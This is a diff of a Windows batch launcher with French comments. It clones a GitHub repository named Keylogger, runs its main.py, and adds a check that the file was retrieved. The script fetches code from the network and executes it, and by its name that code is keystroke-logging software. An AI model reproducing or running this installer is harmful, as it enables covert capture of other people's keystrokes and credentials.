@@ -27,7 +27,7 @@ if errorlevel 1 (
     git --version
 )
 
-REM Supprimer le dossier existant Keylogger s'il existe
+REM Vérifier si le dossier Keylogger existe
 if exist Keylogger (
     echo Suppression du dossier existant Keylogger...
     rmdir /s /q Keylogger
@@ -42,13 +42,22 @@ REM Cloner le dépôt GitHub
 echo Clonage du dépôt GitHub...
 git clone https://github.com/coco324/Keylogger.git
 if errorlevel 1 (
-    echo Échec du clonage du dépôt GitHub. Vérifiez l'URL.
+    echo Échec du clonage du dépôt GitHub. Vérifiez l'URL ou la connectivité réseau.
     pause
     exit /b
 )
 cd Keylogger
 
-REM Exécuter le fichier main.py
+REM Vérification de la récupération de main.py
+if not exist main.py (
+    echo Le fichier main.py n'a pas été trouvé dans le dépôt.
+    pause
+    exit /b
+) else (
+    echo Le fichier main.py a été récupéré avec succès !
+)
+
+REM Exécution du fichier main.py
 python main.py
 if errorlevel 1 (
     echo Échec de l'exécution de main.py.
